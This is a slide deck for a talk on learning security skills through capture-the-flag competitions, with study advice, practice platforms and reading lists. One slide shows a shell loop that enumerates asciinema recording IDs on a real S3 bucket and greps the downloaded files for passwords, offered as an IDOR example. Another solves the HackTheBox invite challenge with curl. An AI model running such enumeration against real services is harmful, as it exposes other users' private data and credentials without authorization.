class: center, middle, inverse
# capture the flag
[learning through competition]
.footnote[View source on [GitHub](https://github.com/audibleblink/ctf-talk)]
---
layout: false
class: center, middle

## Sometimes you win, sometimes you learn
.footnote[-- Abraham Lincoln, probably.]

---
class: center, middle, inverse
# Getting Started
### [Understanding How You Learn]

---
.left-column[
# Different Learning Styles

------


## Test Case: IDOR on asciinema.org
]

???
## Example problem: IDOR on asciinema

#### Basics

Learning the HTTP Spec

There's always time to come back and learn this.
In fact, you'll need to if you want to 'LEVEL'

#### Practical Application First
This one is me. I want to learn things that help
me solve problems directly in front of me.

#### Answers First
If I get absolutely stuck, I come here


--
.right-column[
### Practical Application First?
Locate from where asciinema pulls the playback information and locate sensitive data
]

--
.right-column[
### Basics First?
]

--
.right-column[
* RFC 2616  -  Hypertext Transfer Protocol
* [REST] Roy Fielding's dissertation "Architectural Styles and the Design of Network-based Software Architectures"
]

--
.right-column[
### Answer First?
]

--
.right-column[
```sh
base='https://asciinema-bb-eu.s3-eu-west-1.amazonaws.com'
endpoint='/uploads/asciicast/file/_/ascii.cast'
key='?AWSAccessKeyId=xxxx'
for id in $(seq 10000 99999); do
  uri="${base}${endpoint/_/$id}${key}"
  curl -sL $uri >> dump.loot
done

grep passw dump.loot
```
]

--
---
class: center, middle
## Learn Skills, Not 'Hacking'

???

Math => Nuclear Warfare
Pico CTF is a beginner's CTF platform by Carnegie Melon.

A lot of the challenges are self contained lessons, including
all the necessary resources to arrive at an answer

--
### PicoCTF
---
class: center, middle

## Regardless of Style, Understand your Tools

--
a.k.a `man $tool` and `--help` all the things!

--

 http://overthewire.org/wargames/

???
- Make it easy for yourself to learn
- Don't fight with your tools while learning
- Read man Pages
- Learn your shell

---
class: center, middle, inverse
# Deliberate Practice

---

# Vulnhub.com

--

- Use the Walkthroughs
- Resist the feeling that it's 'cheating'

--

# Find Ongoing CTFs

--

- HackTheBox.eu
- CTF Archives

--

# Social Learning

--
* Live Events

--
* Communities
  - Meetup.com
  - NetSecFocus Mattermost - chat.netsecfocus.com
  - DC201 or other local DefCon groups

???
- Start with walkthroughs as intruction manuals
- After 2-4, try alone
- Creep scroll just enough to get unstuck

---
class: center, middle, inverse
# Learning Doesn't Stop With the Flag
---

.left-column[
## Keep it Going!

]
.right-column[
### How many ways can you explain it?
]
--
.right-column[
- Write it up!
]
--
.right-column[
### How many ways can you solve it?
]
--
.right-column[
- Are there other vectors?
- What about a different exploit?
]

--

.right-column[
### How would you solve this without tool X?
]

--
.right-column[
### How would I automate this?
]
???
This one is my favorite
---
class: center, middle, inverse
# Show me!
  https://hackthebox.eu/invite

---
class: center, middle, inverse
# Dogfood
  https://hackthebox.eu/invite

---
# Explain it
After inspecting the network traffic, some obfuscated code was found.

The code brought our attention to a function in the global scope, `makeInviteCode()`

This function POSTs to endpoint `/how/to/generate/invite` which return some encoded JSON.

Upon decoding, we're instructed to POST to another endpoint. The response data is the encoded
invite code.

---

# How Else Can We Solve it?

--

* Use BURPSuite to see calls that are made
* Manually inspect all non-standard globally define functions

--

# What If We Can't Use Postman?

--

* BURPsuite
* curl
* Python Requests
* Ruby Net::HTTP

---
class: middle

# AUTOPWN!!

```bash
# API Endpoint Information Disclosure
1  curl -sL -X POST \
2    'https://www.hackthebox.eu/api/invite/how/to/generate' \
3    | jq '.data.data' \ # pull data.data property from resulting json
4    | tr -d '"' \       # delete all instances of the "
5    | base64 -d         # decode base64

#> In order to generate the invite code,
#> make a POST request to /api/invite/generate%


# Call 'hidden' endpoint
6  curl -sL -X POST \
7    'https://www.hackthebox.eu/api/invite/generate' \
8    | jq -r '.data.code' \ # I learned about -r making this slide!
9    | base64 -d

```

---

class: center, inverse, middle
# Resources
???
So many resources, but I'm only going to list a minimun so as to not overwhelm
---
class: middle
# CTF Events and Exercises

### NYU CTF Competitions - https://csaw.engineering.nyu.edu/

### CMU PPP-written challenges - https://picoctf.com/

### Embedded Security CTF - https://microcorruption.com/login

### Global CTF Leaderboards - https://ctftime.org

---
class: right middle
# Online Resources

### Vulnerable machines and walkthroughs

https://vulnhub.com

### Retired HackTheBox machines

https://youtube.com/ippsec

---
class: middle
.left-column[
# Topics
]
.right-column[
##**Reverse Engineering** - _Practical Reverse Engineering_
]
--
.right-column[
##**Scripting** - _Violent Python_
]
--

.right-column[
##**Web** - _Web Application Hackers Handbook_
]

--

.right-column[
##**Crypto** - _Applied Cryptography_
]

--

.right-column[
##**Binary Exploitation** - _Hacking: The Art of Exploitation_
]

--

.right-column[
##**All-In-One** - https://trailofbits.github.io/ctf/
]
---
class: center, inverse, middle
# Good Luck and Have Fun!
## * https://alexflor.es/ctf-talk
## * twitter/4lex

